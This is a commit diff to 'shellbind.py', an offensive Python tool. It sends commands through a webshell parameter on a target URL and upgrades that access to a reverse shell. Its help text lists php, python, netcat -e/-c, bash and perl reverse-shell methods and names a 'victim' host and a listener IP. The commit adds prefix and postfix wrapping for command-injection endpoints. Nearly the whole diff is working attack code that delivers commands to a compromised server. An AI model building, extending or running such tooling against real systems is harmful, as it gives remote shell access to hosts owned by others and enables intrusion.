766e8f5c506e66ab777392c545ab98ee11415c50
Sol/Hydr0nium <anonymous@example.com>
2023-07-04 21:48:00 +0200

    Added prefix and postfix for command injection endpoints + some bug fixes

--- shellbind.py
+++ shellbind.py
@@ -13,21 +13,23 @@ import multiprocessing
 # Parse Command Line Arguments
 parser = argparse.ArgumentParser(description="Shellbind is a programm that helps to upgrade a simple GET/POST webshell into a semi- or fully-interactive (reverse) shell.", epilog="Examples:\n-Semi interactive shell (no cd, su, etc.)\n\tshellbind.py -X POST -p cmd -u http://vuln.example/shell.php\n-Fully interactive shell with verbose output\n\tshellbind.py -p cmd -u http://vuln.example/shell.py -v -r auto:10.10.13.37:8080", formatter_class=argparse.RawTextHelpFormatter)
 
-parser.add_argument("-p", "--parameter", metavar="PARAMETER NAME", dest="para_name", help="The parameter the is used to run shell commands", required=True, nargs=1)
-parser.add_argument("-X" , "--method", metavar="METHOD", dest="method", help="The method (GET/POST) that that is used (Default: GET)", default=["GET"], nargs=1)
-parser.add_argument("-u", "--host", dest="host", metavar="HOST", help="The host that is attacked.\nExample: http://www.victim.com/vuln.php", required=True, nargs=1)
+parser.add_argument("-p", "--parameter", metavar="PARAMETER NAME", dest="para_name", help="The parameter the is used to run shell commands", required=True)
+parser.add_argument("-X" , "--method", metavar="METHOD", dest="method", help="The method (GET/POST) that that is used (Default: GET)", default="GET")
+parser.add_argument("-u", "--host", dest="host", metavar="HOST", help="The host that is attacked.\nExample: http://www.victim.com/vuln.php", required=True)
 parser.add_argument("-v", "--verbose", dest="debug", help="Verbose Output", action='store_true', default=False)
-parser.add_argument("-r", "--reverse", dest="reverse", help="If set the programm upgrades the connection from a webshell to a fully-interactive reverse shell.\nAvailable methods are:\n  auto - Try until a reverse shell binds\n  php - php reverseshell\n  py - python3 reverse shell with sockets\n  py2 - python2 reverse shell with sockets\n  nc1 - netcat reverse shell with -e flag\n  nc2 - netcat reverse shell with -c flag\n  bash - sh -i reverse shell\n  perl - perl reverse shell\nLHOST should be the ip that the victim can connect to\nThe port can be any unused port", metavar="METHOD:LHOST:PORT", nargs=1)
+parser.add_argument("-r", "--reverse", dest="reverse", help="If set the programm upgrades the connection from a webshell to a fully-interactive reverse shell.\nAvailable methods are:\n  auto - Try until a reverse shell binds\n  php - php reverseshell\n  py - python3 reverse shell with sockets\n  py2 - python2 reverse shell with sockets\n  nc1 - netcat reverse shell with -e flag\n  nc2 - netcat reverse shell with -c flag\n  bash - sh -i reverse shell\n  perl - perl reverse shell\nLHOST should be the ip that the victim can connect to\nThe port can be any unused port", metavar="METHOD:LHOST:PORT")
+parser.add_argument("--prefix", dest="prefix", help="Set a prefix that is send before every command in case of semi-interactive or once for the reverse shell if fully-interactive", default="")
+parser.add_argument("--postfix", dest="postfix", help="Set a postfix that is send after every command in case of semi-interactive or once for the reverse shell if fully-interactive", default="") 
 args = parser.parse_args()
 
 # Initilized listener and start trying reverse shell payloads
 def init_upgraded_shell():
-    args.method[0] = args.method[0].upper()
-    if args.method[0] not in ["GET", "POST"]:
+    args.method = args.method.upper()
+    if args.method not in ["GET", "POST"]:
         print(f"[!] Method {args.method} not recognized")
         sys.exit()
     try:
-        payload_method, ip, port = args.reverse[0].split(":")
+        payload_method, ip, port = args.reverse.split(":")
         port = int(port)
         # Payloads from revshells.com
         payloads = {
@@ -59,12 +61,12 @@ def back_call(payload_method, ip, port, payloads):
             try:
                 if args.debug:
                     print(f"[!] Trying: {payload}") 
-                if args.method[0] == "GET":
-                    params = {args.para_name[0]: payload}
-                    requests.get(args.host[0], params=params, timeout=timeout)
-                elif args.method[0] == "POST":
-                    params = {args.para_name[0]: payload}
-                    requests.post(args.host[0], data=params, timeout=timeout)
+                if args.method == "GET":
+                    params = {args.para_name: args.prefix + payload + args.postfix}
+                    requests.get(args.host, params=params, timeout=timeout)
+                elif args.method == "POST":
+                    params = {args.para_name: args.prefix + payload + args.postfix}
+                    requests.post(args.host, data=params, timeout=timeout)
                 time.sleep(1)
             except:
                 pass
@@ -73,12 +75,12 @@ def back_call(payload_method, ip, port, payloads):
         try:
             if args.debug:
                 print(f"[!] Trying: {payload}") 
-            if args.method[0] == "GET":
-                params = {args.para_name[0]: payload}
-                requests.get(args.host[0], params=params, timeout=timeout)
-            elif args.method[0] == "POST":
-                params = {args.para_name[0]: payload}
-                requests.post(args.host[0], data=params, timeout=timeout)
+            if args.method == "GET":
+                params = {args.para_name: payload}
+                requests.get(args.host, params=params, timeout=timeout)
+            elif args.method == "POST":
+                params = {args.para_name: payload}
+                requests.post(args.host, data=params, timeout=timeout)
             time.sleep(1)
         except:
             pass
@@ -107,8 +109,8 @@ def interactive_shell(ip, port, child_process):
     
 
 def web_shell():
-    args.method[0] = args.method[0].upper()
-    if args.method[0] not in ["GET", "POST"]:
+    args.method = args.method.upper()
+    if args.method not in ["GET", "POST"]:
         print(f"[!] Method {args.method} not recognized")
         sys.exit()
     if args.debug:
@@ -116,15 +118,16 @@ def web_shell():
     while True:
         try:
             command = input("$ ")
-            if args.method[0] == "GET":
-                params = {args.para_name[0]: command}
-                res = requests.get(args.host[0], params=params)
+            command = args.prefix + command + args.postfix
+            if args.method == "GET":
+                params = {args.para_name: command}
+                res = requests.get(args.host, params=params)
             else:
-                params = {args.para_name[0]: command}
-                res = requests.post(args.host[0], data=params)
+                params = {args.para_name: command}
+                res = requests.post(args.host, data=params)
             print(res.text)
         except requests.ConnectionError:
-            host = args.host[0].replace("\n", "")
+            host = args.host.replace("\n", "")
             print(f"[!] Connection to {host} not possible")
             sys.exit()
         except KeyboardInterrupt:
